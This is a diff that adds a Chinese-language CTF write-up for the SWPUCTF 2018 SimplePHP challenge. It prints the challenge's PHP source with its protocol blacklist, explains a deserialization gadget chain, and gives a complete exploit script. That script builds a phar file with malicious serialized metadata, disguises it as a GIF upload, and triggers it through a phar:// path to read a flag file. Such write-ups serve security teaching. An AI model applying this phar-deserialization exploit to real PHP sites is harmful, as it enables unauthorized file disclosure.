@@ -86,3 +86,133 @@ print flag //42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5
     运行./php_mt_seed 42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5 5 0 61 31 31 0 61 7 7 0 61 22 22 0 61
     得到338669776
     还原20位的随机数得到flag
+    
+### 10.[SWPUCTF 2018]SimplePHP
+考察的是关于php伪协议和反系列化
+```php
+<?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct($name)
+    {
+        $this->str = $name;
+    }
+    public function __destruct()
+    {
+        $this->test = $this->str;
+        echo $this->test;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct($file)
+    {
+        $this->source = $file;   //$this->source = phar://phar.jpg
+        echo $this->source;
+    }
+    public function __toString()
+    {
+        $content = $this->str['str']->source;
+        return $content;
+    }
+    public function __set($key,$value)
+    {
+        $this->$key = $value;
+    }
+    public function _show()
+    {
+        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
+            die('hacker!');
+        } else {
+            highlight_file($this->source);
+        }
+        
+    }
+    public function __wakeup()
+    {
+        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
+            echo "hacker~";
+            $this->source = "index.php";
+        }
+    }
+}
+class Test
+{
+    public $file;
+    public $params;
+    public function __construct()
+    {
+        $this->params = array();
+    }
+    public function __get($key)
+    {
+        return $this->get($key);
+    }
+    public function get($key)
+    {
+        if(isset($this->params[$key])) {
+            $value = $this->params[$key];
+        } else {
+            $value = "index.php";
+        }
+        return $this->file_get($value);
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }
+}
+?>
+```
+构造链：`__get()`调用了`file_get()`方法，而这个`file_get()`方法就为我们需要用到的读取flag文件的方法，而触发`__get`就需要调用这个类中不存在的函数，我们看到Show类中的`__toString()`中调用了`$this->str['str']->source;`而这个`str['str']`是我们可以控制的，所以可以使这个`str['str']`储存`Test`类，而`__toString`需要一个类作为字符串输出用，这时`C1e4r`类中存在一个`__destruct()`方法，里面有一个`echo $this->test;`这样构造链接就形成了
+payload:
+```php
+<?php
+class C1e4r{
+    public $test;
+    public $str;
+}
+
+class Show
+{
+    public $source;
+    public $str;
+}
+
+class Test
+{
+    public $file;
+    public $params;
+
+}
+
+$a = new Test();
+$a->params = [
+    'source' => '/var/www/html/f1ag.php'
+];
+
+$b = new Show();
+$b->str['str'] = $a;
+
+$c = new C1e4r();
+$c->str = $b;
+
+$phar = new Phar("test123.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($c); //将自定义的meta-data存入manifest
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+$phar->stopBuffering();//签名自动计算
+copy('test123.phar','exp.gif');
+$name = 'exp.gif'.'174.0.10.213';
+echo md5($name);//37897b4e2daea073c403f3985955cd0f
+?>
+```
+最终payload:file=phar://upload/37897b4e2daea073c403f3985955cd0f.jpg
+`phar会自动反系列化Metadata中的数据,不管后缀如何`
